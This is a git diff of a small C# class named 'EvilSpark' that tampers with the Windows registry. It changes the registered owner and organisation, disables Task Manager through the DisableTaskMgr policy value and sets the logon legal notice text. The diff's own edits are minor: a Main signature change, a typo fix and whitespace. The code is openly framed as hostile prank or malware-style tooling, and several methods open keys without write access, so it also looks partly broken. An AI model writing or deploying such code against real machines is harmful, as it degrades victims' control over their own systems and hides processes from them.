@@ -4,9 +4,9 @@ using Microsoft.Win32;
 
 class EvilSpark
 {
-    static void Main()
+    static void Main(string[] args)
     {
-        
+        //call any one of the methods from here
     }
     public void ChangeRegisteredOwner(string name)
     {
@@ -18,16 +18,18 @@ class EvilSpark
             }
         }
     }
+    
     public void ChangeRegisteredOrganization(string name)
     {
         using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion",true))
         {
             if (key != null)
             {
-                key.SetValue("Registeredrganization", name);
+                key.SetValue("RegisteredOrganization", name);
             }
         }
     }
+    
     public void DisableTaskManager()
     {
         using(var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
@@ -35,6 +37,7 @@ class EvilSpark
             key.SetValue("DisableTaskMgr", "1");
         }
     }
+    
     public void EnableTaskManager()
     {
         using(var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
@@ -51,12 +54,4 @@ class EvilSpark
             key.SetValue("legalnoticetext", text);
         }
     }
-    
 }
-    
-    
-    
-    
-    
-    
-    
